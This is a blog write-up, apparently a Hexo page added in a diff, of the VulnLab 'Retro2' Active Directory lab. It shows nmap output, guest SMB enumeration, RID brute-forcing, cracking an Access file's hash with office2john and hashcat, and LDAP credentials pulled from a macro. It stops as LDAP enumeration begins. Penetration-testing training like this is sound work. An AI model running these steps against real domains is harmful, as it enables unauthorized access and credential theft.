@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <!-- bing -->
+  <meta name="msvalidate.01" content="D6E6F0AB3EAD6BA4F5541EDCB8EEDCC5" />
+
+  <!-- toc.js -->
+  <script src='/js/toc.js'> </script>
+  <script>
+  window.addEventListener('hexo-blog-decrypt', function(event) {
+    setTimeout(() => {
+      makeList({
+       'target': '#toc',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+
+      makeList({
+       'target': '#toc-mobile',   // Selector for element to place table of contents
+       'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+      });
+    }, 1000);
+  });  
+  </script>
+  
+  <!-- mane defined -->
+  <script>
+    function scriptOnError(errorMsg){
+      try{ document.body.innerHTML = ""; }catch{}
+      document.write("<h1>Error: Loading script error. </h1>");
+      document.write("<p>Some script loading error, Please Disable AD Block and retry again.</p>");
+      document.write("<p>很抱歉，有些脚本似乎無法正常加載，請嘗試關閉 AD Block 再試一次。</p>");
+      document.write("<p>Error on loading: ");
+      document.write(errorMsg);
+      document.write("</p>");
+
+      window.stop ? window.stop() : document.execCommand("Stop");
+    }
+  </script>
+
+  <!-- GTM -->
+  <script>
+    if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+        (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+          'https://www.googletagmanager.com/gtm.js?id='+i+dl;
+          f.parentNode.insertBefore(j,f);
+          })(window,document,'script','dataLayer','GTM-T952MB6B');
+    }
+  </script>
+
+  <!-- clarity -->
+  <script type="text/javascript">
+      (function(c,l,a,r,i,t,y){
+          c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+          t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+          y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+      })(window, document, "clarity", "script", "ph6eztilds");
+  </script>
+
+  <!-- check baseurl -->
+  <script>
+    setInterval( ()=>{
+      if ((window.location.hostname != "localhost" ) && (window.location.hostname != "manesec.github.io") ){
+          window.location.href = "https://manesec.github.io" + window.location.pathname;
+      }
+    }, 500);
+  </script>
+
+   <!-- fancybox support -->
+   
+     
+<link rel="stylesheet" href="/js/fancybox/jquery.fancybox.min.css">
+
+   
+
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;eb970d97-70ee-47b0-8e37-f7b0803f5e4a 首先，通過 nmap 掃描確定目標環境是一個活動目錄 (AD)，接著使用來賓賬戶查看 SMB 共享目錄，找到了一個名為 ‘public’ 的目錄然後嘗試查看其中的內容。但在發現一個需要密碼的文件後，使用 office2john 將文件的 h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnLab - Machine - Retro2">
+<meta property="og:url" content="https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/index.html">
+<meta property="og:site_name" content="Mane">
+<meta property="og:description" content="​​ https:&#x2F;&#x2F;api.vulnlab.com&#x2F;api&#x2F;v1&#x2F;share?id&#x3D;eb970d97-70ee-47b0-8e37-f7b0803f5e4a 首先，通過 nmap 掃描確定目標環境是一個活動目錄 (AD)，接著使用來賓賬戶查看 SMB 共享目錄，找到了一個名為 ‘public’ 的目錄然後嘗試查看其中的內容。但在發現一個需要密碼的文件後，使用 office2john 將文件的 h">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103065516-vkxr1gm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045406-vczblh4.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103050154-2f49fkc.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045508-i2p7g0p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045637-w2yh6eq.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045708-8tjlteg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045846-yjifdkm.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103050017-cmjb53k.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103050033-bj4dc2p.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103050408-e9htdqv.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103051437-b6o973y.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103051541-u3rkvjg.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103052041-xwkydt7.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103053422-1rfi90f.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103061420-itojhqz.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103061337-n7wjvf6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103062633-398lgvh.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103062719-029xsel.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103062743-9ns4lk6.png">
+<meta property="og:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103065403-ei5bmtu.png">
+<meta property="article:published_time" content="2025-01-03T17:52:00.000Z">
+<meta property="article:modified_time" content="2025-01-03T17:54:09.080Z">
+<meta property="article:author" content="manesec">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103065516-vkxr1gm.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VulnLab - Machine - Retro2</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T952MB6B"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-8C677QTBX9"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-8C677QTBX9');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/01/04/2025/11-vulnlab-sync/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/01/03/2025/09-vulnlab-retro/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&text=VulnLab - Machine - Retro2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&is_video=false&description=VulnLab - Machine - Retro2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Retro2&body=Check out this article: https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&title=VulnLab - Machine - Retro2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&name=VulnLab - Machine - Retro2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/04/2025/10-vulnlab-retro2/&t=VulnLab - Machine - Retro2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc"></div>
+    <style>
+    	#toc {
+	}
+    	#toc ul {
+	   display: grid ! important;
+	}
+    	#toc li {
+	   margin: 0 0 0 0 ! important;  
+	}
+	#toc .level-1 {
+	   font-size: 0.8rem;
+	   color: #ffffff ;
+	   background: #2bbc8ae5;
+	   padding-left: 3px;
+           padding-right: 3px;
+	}
+
+
+	#toc .level-1:hover {
+	   background: #00b4ddc7;
+	   color: #ffffff !important;
+	}
+
+	#toc .level-2 {
+	   font-size: 0.8rem;
+	   color: #2bbc8a;
+	}
+	#toc .level-3 {
+	   font-size: 0.7rem;
+	   color: #40474b;
+	}
+	#toc .level-4 , #toc .level-5, #toc .level-6 {
+	   font-size: 0.6rem;
+	   color: #8c8c8c;
+	}
+    </style>
+    
+    
+      <script>
+      	setTimeout(() => {
+	  makeList({
+	     'target': '#toc',   // Selector for element to place table of contents
+	     'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+	  });
+	}, 1000);
+      </script>
+     
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VulnLab - Machine - Retro2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">manesec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-01-03T17:52:00.000Z" class="dt-published" itemprop="datePublished">2025-01-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103065516-vkxr1gm.png" alt="image">​</p>
+<p><a target="_blank" rel="noopener" href="https://api.vulnlab.com/api/v1/share?id=eb970d97-70ee-47b0-8e37-f7b0803f5e4a">https://api.vulnlab.com/api/v1/share?id=eb970d97-70ee-47b0-8e37-f7b0803f5e4a</a></p>
+<p>首先，通過 nmap 掃描確定目標環境是一個活動目錄 (AD)，接著使用來賓賬戶查看 SMB 共享目錄，找到了一個名為 ‘public’ 的目錄然後嘗試查看其中的內容。但在發現一個需要密碼的文件後，使用 office2john 將文件的 hash 轉換並使用 hashcat 破解，最終得到了文件的密碼並打開文件揭示其中包含宏的提示。儘管得到了一些賬號密碼信息，這些憑據提供的權限有限，因此使用 ldapsearch 和 Bloodhound.py 收集更多關於域的數據，發現目標機器的某些屬性配置，從中找到利用機會。無法通過 Kerberoasting 或 RBCD 攻擊的情況下，基於 Windows 的版本特性，直接設置密碼來獲得對服務組的操作權限，最終成功使用 RDP 登錄，並進行提權操作訪問高級用戶的資料。通過參考相關博客和 GitHub 上的資源，採用了特殊的方法完成了進一步的總控系統獲取，最後從 administrator 的桌面提取了 root.txt。</p>
+<h1 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h1><p>首先先進行 nmap 掃描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE            REASON          VERSION</span><br><span class="line">53/tcp    open  domain             syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15F75) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15F75)</span><br><span class="line">88/tcp    open  tcpwrapped         syn-ack ttl 127</span><br><span class="line">135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap               syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds       syn-ack ttl 127 Windows Server 2008 R2 Datacenter 7601 Service Pack 1 microsoft-ds (workgroup: RETRO2)</span><br><span class="line">464/tcp   open  kpasswd5?          syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http         syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped         syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap               syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: retro2.vl, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped         syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: RETRO2</span><br><span class="line">|   NetBIOS_Domain_Name: RETRO2</span><br><span class="line">|   NetBIOS_Computer_Name: BLN01</span><br><span class="line">|   DNS_Domain_Name: retro2.vl</span><br><span class="line">|   DNS_Computer_Name: BLN01.retro2.vl</span><br><span class="line">|   DNS_Tree_Name: retro2.vl</span><br><span class="line">|   Product_Version: 6.1.7601</span><br><span class="line">|_  System_Time: 2025-01-02T21:02:45+00:00</span><br><span class="line">|_ssl-<span class="built_in">date</span>: 2025-01-02T21:03:25+00:00; -5s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=BLN01.retro2.vl</span><br><span class="line">| Issuer: commonName=BLN01.retro2.vl</span><br><span class="line">| Public Key <span class="built_in">type</span>: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">| Not valid before: 2024-08-16T11:25:28</span><br><span class="line">| Not valid after:  2025-02-15T11:25:28</span><br><span class="line">| MD5:   c143:3f93:3212:acb7:835d:31a8:9390:d0b4</span><br><span class="line">| SHA-1: b7f5:cd54:e53a:6a8d:407c:578f:c32f:d099:2a87:0ec4</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIC4jCCAcqgAwIBAgIQIzAfKxlOhoZBJL7M4Cp8JjANBgkqhkiG9w0BAQUFADAa</span><br><span class="line">| MRgwFgYDVQQDEw9CTE4wMS5yZXRybzIudmwwHhcNMjQwODE2MTEyNTI4WhcNMjUw</span><br><span class="line">| MjE1MTEyNTI4WjAaMRgwFgYDVQQDEw9CTE4wMS5yZXRybzIudmwwggEiMA0GCSqG</span><br><span class="line">| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQDIFzy0y6odE6ppaBY3kW/99U3ZAiWl2TOO</span><br><span class="line">| wVUg56W1Ym5QvmDD/U0/v7DUhnwmYONS8/270pDfVyF4IDpqmwrsaMIykxpsKbdY</span><br><span class="line">| uSshQtrfw6qkOTV20lYV7o0yRagxV6Y+wdWu5t5FDXnLrAOfQWLZ1fuiOM0yxZZ/</span><br><span class="line">| BmUoSbRssSD8HbqO424s+2Vk0fnRsy92RAAxi6+hU/AnNQivWUYXy/uzbSQLNMAO</span><br><span class="line">| tqlGmKLrFuetvzCekn5K6ccIxSig2bBwhRsKHiitgasoBgCYGdHsqVsrzVNfFp6L</span><br><span class="line">| cmSIDdZA6MTqvBwvGZnhmoPuvlm1VU2AX7wmgCUODe06i2H42AiHAgMBAAGjJDAi</span><br><span class="line">| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQUF</span><br><span class="line">| AAOCAQEAwoXSDhw8Fj7gMqiTaQlTl+nb+5ISICEY8oERx7srLMYh32EfliRSH0mO</span><br><span class="line">| 45d2fK0h0y0d+zuTv/+DbmiBrd689sp0j2gCGh/BbLor3y4gcNlAK+q7LNhbix2u</span><br><span class="line">| NRoeIEsSnnjv2GU1sF7/RWeikPzLMCHlzSOlz7ZwYSu9ajZDOtwN3uKL+Bo1qwTD</span><br><span class="line">| nhlBhs9mNFd1RfsZZIi4F3F9gKKgLO93JoHv5N4Lo7KTe7fblr658U6whDeOw8wa</span><br><span class="line">| dppHdA+eTBhMN/parZKVvw0a7rCTWyjmCjJmnc1oUMrHDX0hjFWIovg2kEIaGwWf</span><br><span class="line">| WBx0JjJHIfK9R5NoY6/dhkQNKhHa3Q==</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">5722/tcp  open  msrpc              syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">9389/tcp  open  mc-nmf             syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http         syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49173/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">Service Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="Enum-smb-share-folder"><a href="#Enum-smb-share-folder" class="headerlink" title="Enum smb share folder"></a>Enum smb share folder</h1><p>可以看得出這是個 AD， 使用 guest 看一下smb的共享目錄：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.109.46 -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --shares</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045406-vczblh4.png" alt="image">​</p>
+<p>看到有一個public的目錄，既然成功的讀取了内容那就嘗試 <code>rid-brute</code>​：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.109.46 -u <span class="string">&#x27;guest&#x27;</span> -p <span class="string">&#x27;&#x27;</span> --rid-brute</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103050154-2f49fkc.png" alt="image">​</p>
+<p>得到一堆用戶名：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">admin</span><br><span class="line">BLN01$</span><br><span class="line">Julie.Martin</span><br><span class="line">Clare.Smith</span><br><span class="line">Laura.Davies</span><br><span class="line">Rhys.Richards</span><br><span class="line">Leah.Robinson</span><br><span class="line">Michelle.Bird</span><br><span class="line">Kayleigh.Stephenson</span><br><span class="line">Charles.Singh</span><br><span class="line">Sam.Humphreys</span><br><span class="line">Margaret.Austin</span><br><span class="line">Caroline.James</span><br><span class="line">Lynda.Giles</span><br><span class="line">Emily.Price</span><br><span class="line">Lynne.Dennis</span><br><span class="line">Alexandra.Black</span><br><span class="line">Alex.Scott</span><br><span class="line">Mandy.Davies</span><br><span class="line">Marilyn.Whitehouse</span><br><span class="line">Lindsey.Harrison</span><br><span class="line">Sally.Davey</span><br><span class="line">ADMWS01$</span><br><span class="line">inventory</span><br><span class="line">ldapreader</span><br><span class="line">FS01$</span><br><span class="line">FS02$</span><br></pre></td></tr></table></figure>
+
+<p>嘗試看一下 <code>Public</code>​ 裏面有些什麽：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -U <span class="string">&quot;guest%&quot;</span> //10.10.109.46/Public</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045508-i2p7g0p.png" alt="image">​</p>
+<p>結果看到 <code>db</code>​下面有個文件，但是打開後提示需要密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045637-w2yh6eq.png" alt="image">​</p>
+<h1 id="Crack-access-db-password-with-office2john"><a href="#Crack-access-db-password-with-office2john" class="headerlink" title="Crack access db password with office2john"></a>Crack access db password with office2john</h1><p>所以嘗試使用 <code>office2john</code>​ 轉換一下 hash ：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ office2john staff.accdb </span><br><span class="line">staff.accdb:$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045708-8tjlteg.png" alt="image">​</p>
+<p>然後放進去 hashcat 跑跑看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103045846-yjifdkm.png" alt="image">​</p>
+<p>結果破解得到了密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class08</span><br></pre></td></tr></table></figure>
+
+<p>輸入爆破出來的密碼，就成功的打開了該文檔：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103050017-cmjb53k.png" alt="image">​</p>
+<p>可以看到 office 提示說裏面有宏文件，并且禁止執行了，點擊左邊的 <code>Staff</code>​ 得到：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103050033-bj4dc2p.png" alt="image">​</p>
+<p>一眼看下去就看到了賬號密碼：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strLDAP = <span class="string">&quot;LDAP://OU=staff,DC=retro2,DC=vl&quot;</span></span><br><span class="line">strUser = <span class="string">&quot;retro2\ldapreader&quot;</span></span><br><span class="line">strPassword = <span class="string">&quot;ppYaVcB5R&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是這個賬號密碼也是普通用戶，什麽也沒有：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netexec smb 10.10.109.46 -u <span class="string">&#x27;ldapreader&#x27;</span> -p <span class="string">&#x27;ppYaVcB5R</span></span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/10-vulnlab-Retro2/image-20250103050408-e9htdqv.png" alt="image">​</p>
+<h1 id="Add-ldapreader-to-service-group-and-login-with-RDP"><a href="#Add-ldapreader-to-service-group-and-login-with-RDP" class="headerlink" title="Add ldapreader to service group and login with RDP"></a>Add ldapreader to service group and login with RDP</h1><p>所以嘗試使用 ldapsearch 搜索一下關於<code>Pre-Windows 2000 computers</code>​ 的電腦：</p>
